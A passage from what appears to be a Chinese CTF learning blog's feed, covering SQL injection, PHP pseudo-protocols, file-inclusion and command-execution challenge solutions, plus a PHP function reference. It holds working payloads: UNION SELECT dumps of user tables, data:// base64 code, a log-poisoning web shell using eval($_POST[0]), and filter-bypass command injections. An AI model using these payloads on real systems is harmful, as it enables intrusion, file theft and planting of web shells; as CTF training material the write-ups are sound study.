class="hljs-string">&#x27;users&#x27;</span>#<br></code></pre></td></tr></table></figure><p><img src="/images/RV9CJ.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>))))))<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure><p><img src="/images/P2KH.png"></p><p>这是一个假的flag，不能用这个方法解题<br>用另一语句查找</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata #<br></code></pre></td></tr></table></figure><p><img src="/images/2QN.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctftraining&#x27;</span>#<br></code></pre></td></tr></table></figure><p><img src="/images/QE1.png"></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-number">1</span>)))))) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,flag <span class="hljs-keyword">from</span> ctftraining.flag<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="/images/CFC44N6.png"><br>获得flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>常见PHP语法</title>
    <link href="/2023/05/09/php/"/>
    <url>/2023/05/09/php/</url>
    
    <content type="html"><![CDATA[<h2 id="Include"><a href="#Include" class="headerlink" title="Include()"></a>Include()</h2><p>Include(‘‘)用于获取指定文件中存在的所有文本，代码和标记，并复制到使用该语句的  </p><p>文件中，在服务器执行之前，将php文件的内容插入到另一个php文件。</p><h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h2><p>语法：<br>Sub(string,start,Length)<br><strong>string:</strong>  必须。规定要返回其中一部分的字符串。</p><blockquote><h4 id="start-必须。规定在字符串的何处开始。"><a href="#start-必须。规定在字符串的何处开始。" class="headerlink" title="start: 必须。规定在字符串的何处开始。"></a>start: 必须。规定在字符串的何处开始。</h4><ul><li>正数 - 在字符串的指定位置开始</li><li>负数 - 在从字符串结尾开始的指定位置开始</li><li>0 - 在字符串中的第一个字符处开始</li></ul></blockquote><blockquote><h4 id="Length-可选。规定被返回字符串的长度。默认是直到字符串的结尾。"><a href="#Length-可选。规定被返回字符串的长度。默认是直到字符串的结尾。" class="headerlink" title="Length:可选。规定被返回字符串的长度。默认是直到字符串的结尾。"></a>Length:可选。规定被返回字符串的长度。默认是直到字符串的结尾。</h4><ul><li>   正数 - 从 start 参数所在的位置返回的长度</li><li>   负数 - 从字符串末端返回的长度</li></ul></blockquote><h2 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval()函数"></a>intval()函数</h2><p>intval() 函数用于获取变量的整数值。<br>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><blockquote><h4 id="int-intval-mixed-var-int-base-x3D-10"><a href="#int-intval-mixed-var-int-base-x3D-10" class="headerlink" title="int intval ( mixed $var [, int $base &#x3D; 10 ] )"></a>int intval ( mixed $var [, int $base &#x3D; 10 ] )</h4><ul><li>$var：要转换成 integer 的数量值。</li><li>$base：转化所使用的进制。</li></ul></blockquote><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<br>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>将使用 10 进制 (decimal)。</p><h2 id="stype-alpha-函数"><a href="#stype-alpha-函数" class="headerlink" title="stype_alpha()函数"></a>stype_alpha()函数</h2><h4 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h4><p>ctype_alpha()函数是PHP中的字符类型(CType)函数，用于检查给定的字符串是否仅包含字母。</p><p>如果字符串只包含字母，返回bool <strong>true</strong> ，否则返回bool <strong>false</strong>。</p><h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><p>ctype_alpha(string):bool</p><h2 id="Is-numerice-函数"><a href="#Is-numerice-函数" class="headerlink" title="Is_numerice()函数:"></a>Is_numerice()函数:</h2><h4 id="作用：-1"><a href="#作用：-1" class="headerlink" title="作用："></a>作用：</h4><p>函数用于检测变量是否为数字或数字字符串。<br>返回值：<br>如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE。</p><h2 id="hexdec-函数"><a href="#hexdec-函数" class="headerlink" title="hexdec()函数:"></a>hexdec()函数:</h2><h4 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h4><p>Hexdec()函数把十六进制转换为十进制。</p><h4 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h4><p>Hexdec(hex_string)</p><p>Hex_string:必须，规定要转换的十六进制数</p><h2 id="preg-match-函数"><a href="#preg-match-函数" class="headerlink" title="preg_match()函数:"></a>preg_match()函数:</h2><p>Preg_match函数是进行<a href="https://blog.csdn.net/l1028386804/article/details/116778918?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168186276216800222868537%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168186276216800222868537&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-116778918-null-null.142%5Ev84%5Epc_search_v2,239%5Ev2%5Einsert_chatgpt&utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1018.2226.3001.4187">正则表达式</a>的匹配，成功返回1，否则返回0。</p><h4 id="语法：-2"><a href="#语法：-2" class="headerlink" title="语法："></a>语法：</h4><p>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] )</p><blockquote><ul><li>$pattern: 要搜索的模式，字符串形式。</li><li>$subject: 输入字符串。</li><li>$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</li><li>$flags：flags 可以被设置为以下标记值：<br> 1.PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</li><li>offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</li></ul></blockquote><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p><h2 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace()函数"></a>str_replace()函数</h2><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><p>str_replace()函数替换字符串中的一些字符(区分大小写)。<br>该函数必须遵循下列规则：</p><blockquote><ul><li>如果搜索的字符串是一个数组，那么它将返回一个数组。</li><li>如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。</li><li>如果同时需要对某个数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余的元素将用空字符串进行替换。</li><li>如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。</li></ul></blockquote><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p><strong>str_replace(find,replace,string,count)</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>find</td><td>必需。规定要查找的值。</td></tr><tr><td>replace</td><td>必需。规定替换find中值的值。</td></tr><tr><td>string</td><td>必需。规定被搜索的字符串。</td></tr><tr><td>count</td><td>可选。一个变量，对替换数进行计数。</td></tr></tbody></table><p>返回值：返回带有替换值的字符串或数组。</p><h2 id="strpoos-函数"><a href="#strpoos-函数" class="headerlink" title="strpoos()函数"></a>strpoos()函数</h2><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>查找字符串在另一字符串中第一次出现的位置<br>ps:strpos()函数对大小写敏感&amp;该函数是二进制安全的</p><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><p><strong>strpos(string,find,start)</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要搜索的字符串。</td></tr><tr><td>find</td><td>必需。规定要查找的字符串。</td></tr><tr><td>start</td><td>可选。规定在何处开始搜索。</td></tr></tbody></table><h2 id="array-push-函数"><a href="#array-push-函数" class="headerlink" title="array_push()函数"></a>array_push()函数</h2><h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><p>array_push()函数向数组尾部插入一个或多个元素</p><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><p>array_push(array,valuel,value2…)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>array</td><td>必需。规定一个数组。</td></tr><tr><td>value1</td><td>必需。规定要添加的值。</td></tr><tr><td>value2</td><td>可选。规定要添加的值。</td></tr></tbody></table><p>返回值：返回新数组的元素个数。</p><h2 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array()函数"></a>in_array()函数</h2><h4 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h4><p>in_array()函数搜索数组中是否存在指定的值</p><h4 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h4><p>bool in_array(mixed $needle,array $haystack[,bool $strict &#x3D; FALSE ])</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>needle</td><td>必需。规定要在数组搜索的值。</td></tr><tr><td>haystack</td><td>必需。规定要搜索的数组。</td></tr><tr><td>strict</td><td>可选。如果该参数设置TRUE,则in_array()函数检查搜索的数据与数组的值的类型是否相同。</td></tr></tbody></table><p>返回值：如果在数组中找到值则返回true，否则返回false</p><h2 id="file-put-contents-函数"><a href="#file-put-contents-函数" class="headerlink" title="file_put_contents()函数"></a>file_put_contents()函数</h2><h4 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h4><p>file_put_contents()函数把一个字符串写入文件中。<br>该函数访问文件时，遵循以下规则：<br>1.如果设置了 FILE_USE_INCLUDE_PATH，那么将检查 <em>filename</em> 副本的内置路径<br>2.如果文件不存在，将创建一个文件<br>3.打开文件<br>4.如果设置了 LOCK_EX，那么将锁定文件<br>5.如果设置了 FILE_APPEND，那么将移至文件末尾。否则，将会清除文件的内容<br>6.向文件中写入数据<br>7.关闭文件并对所有文件解锁<br>8.如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。</p><h4 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h4><p>int file_put_contents ( string $filename , mixed $data [, int $flags &#x3D; 0 [, resource $context ]] )</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>filename</td><td>必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件</td></tr><tr><td>data</td><td>必需。规定要写入文件的数据。可以是字符串、数组或数据流。</td></tr><tr><td>flags</td><td>可选。规定如何打开&#x2F;写入文件。可能的值：1.FILE_USE_INCLUDE_PATH。</td></tr><tr><td>context</td><td>可选。规定文件句柄的环境。context是一套可以修改流的行为的选项</td></tr></tbody></table><p>使用 FILE_APPEND 避免删除文件中已存在的内容。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php伪协议🥰</title>
    <link href="/2023/04/27/phpweixieyi/"/>
    <url>/2023/04/27/phpweixieyi/</url>
    
    <content type="html"><![CDATA[<p>php伪协议是ctf中的一个考点，目前比较熟悉的伪协议有php:&#x2F;&#x2F;filter,php:&#x2F;&#x2F;input,data:&#x2F;&#x2F;text&#x2F;plain,file:&#x2F;&#x2F;。<br>要成功应用伪协议需要php.ini文件的<strong>allow_url_fopen 默认开启</strong>       <strong>allow_url_include 默认关闭</strong></p><h2 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F;伪协议"></a>file:&#x2F;&#x2F;伪协议</h2><p>此协议可以在双off的情况下使用，用于访问本地文件<br>使用方法：<br>file:&#x2F;&#x2F;文件绝对路径和文件名 如<a href="http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt">http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</a></p><h2 id="data-x2F-x2F-text-x2F-plain协议"><a href="#data-x2F-x2F-text-x2F-plain协议" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain协议"></a>data:&#x2F;&#x2F;text&#x2F;plain协议</h2><p>此协议需要在双on的情况下才能使用，很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入<br>使用方法：<br>data:&#x2F;&#x2F;text&#x2F;plain;base64,base64编码字符  如<a href="http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p><p>　　　　　data:&#x2F;&#x2F;text&#x2F;plain,字符   如<a href="http://127.0.0.1/cmd.php?file=data://text/plain">http://127.0.0.1/cmd.php?file=data://text/plain</a>,<?php phpinfo()?></p><h2 id="php-input协议"><a href="#php-input协议" class="headerlink" title="php:input协议"></a>php:input协议</h2><p>此协议需要allow_url_include为on，可以访问请求的原始数据的只读流，将post请求的数据作为php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。<br>使用方法：php:&#x2F;&#x2F;input,然后post需要执行的数据 如<a href="http://127.0.0.1/cmd.php?file=php://input">http://127.0.0.1/cmd.php?file=php://input</a>    然后在post中<?php phpinfo() ?><br><img src="/images/hhh.png"></p><h2 id="php-x2F-x2F-filter协议"><a href="#php-x2F-x2F-filter协议" class="headerlink" title="php:&#x2F;&#x2F;filter协议"></a>php:&#x2F;&#x2F;filter协议</h2><p>在双off的情况下也可使用，读取文件并进行显示或写入</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>这个参数是必须的，它指定了你要筛选过滤的数据流。</td></tr><tr><td>read&#x3D;&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符(</td></tr><tr><td>write&#x3D;&lt;写链的筛选列表&gt;</td><td>write&#x3D;&lt;写链的筛选列表&gt;</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>使用方法：<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;文件名(对文件进行base64编码并读取显示)  如：<br><a href="http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php</a> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web入门：文件包含🥰</title>
    <link href="/2023/04/27/wenjianbaohan/"/>
    <url>/2023/04/27/wenjianbaohan/</url>
    
    <content type="html"><![CDATA[<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>include包含，尝试使用伪协议</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>使用base64解码获得flag</p><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = <span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    include(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>str_replace()函数把php替换成了???<br>使用data协议：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=data:<span class="hljs-regexp">//</span>text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=<br></code></pre></td></tr></table></figure><p>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;  —&gt;   <strong>&lt;?php system(‘cat flag.php’);</strong></p><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p>关键源码：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = <span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    include(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个题php和data协议都用不了了，尝试以下包含日志文件<br>通过fn+f12查看网络<br><img src="/images/13.png"><br>或<br>burpsuite抓包<br>或<br>Wappalyzer<br>都可看到<br>本题是nginx服务器</p><p>nginx服务器的日志通常路径为：<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>或<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p><p>本题的路径是&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>在url中输入?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 读取日志<br>发现内容为请求行、UA头、IP地址</p><p>使用burp suite抓包<br>在UA头写入shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>启动中国蚁剑拿到flag</p><p>方法二：</p><p>burp suite抓包<br>在UA头中插入payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl??.php&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>获得flag</p><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>与80题方法一样😊</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web入门:命令执行🫠</title>
    <link href="/2023/04/24/minlinzhixin/"/>
    <url>/2023/04/24/minlinzhixin/</url>
    
    <content type="html"><![CDATA[<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>  &#125;<br>  <br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  &#125;<br><br></code></pre></td></tr></table></figure><p>preg_match函数是进行<a href="https://blog.csdn.net/l1028386804/article/details/116778918?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168190228216800192231163%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168190228216800192231163&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-116778918-null-null.142%5Ev85%5Epc_search_v2,239%5Ev2%5Einsert_chatgpt&utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1018.2226.3001.4187">正则表达式</a>的匹配，成功返回1，否则返回0。<br>在这个正则里边有一个参数是i，这个在正则表达式里边是不区分大小写的一个参数</p><p>查看目录</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>获取flag.php ，关键字flag过滤，使用通配符？</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>ctrl+u查看源码</p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>cp命令将flag.php保存到1.txt 再去访问1.txt</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cp fla?.php 1.txt&quot;</span>);<br></code></pre></td></tr></table></figure><p>接着在url后输入1.txt就可以看到flag了</p><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>存源代码中我们可以看出这次过滤了flag，system，php<br>所以这里我们可以用’’来代替system()，这里的&#96;是tab上面的反斜号</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">?c=`cp fla?.p?? <span class="hljs-number">1</span>.txt`;<br></code></pre></td></tr></table></figure><p>在url后输入1.txt查看获得flag</p><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>从源代码可以看出，这题还过滤了cat和空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以用eval( )来操作， 这个1已经不属于c的内容了，所以不受过滤管控了，</p><p>得到空白页面右击看源码才能得到flag</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p> 将cat 换成 tac 就可以直接看到flag,(tac 是 cat 的反向显示),cat也可以直接看到</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 